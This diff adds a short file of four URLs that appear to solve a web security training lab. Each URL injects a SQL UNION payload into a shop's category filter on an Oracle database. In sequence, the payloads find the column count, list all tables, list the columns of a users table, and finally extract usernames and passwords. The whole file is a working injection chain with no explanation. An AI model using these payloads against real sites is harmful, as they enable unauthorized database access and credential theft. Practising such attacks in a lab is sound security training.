@@ -1,0 +1,7 @@
+https://ac111f451f70a70980246333001c00a4.web-security-academy.net/filter?category=Pets' UNION SELECT NULL,NULL FROM DUAL --
+
+https://ac111f451f70a70980246333001c00a4.web-security-academy.net/filter?category=Pets' UNION SELECT TABLE_NAME,NULL FROM ALL_TABLES --
+
+https://ac111f451f70a70980246333001c00a4.web-security-academy.net/filter?category=Pets' UNION SELECT COLUMN_NAME,NULL FROM ALL_TAB_COLUMNS WHERE TABLE_NAME='USERS_XRSBHJ' --
+
+https://ac111f451f70a70980246333001c00a4.web-security-academy.net/filter?category=Pets' UNION SELECT USERNAME_WYWYUN,PASSWORD_BNVSOL FROM USERS_XRSBHJ --
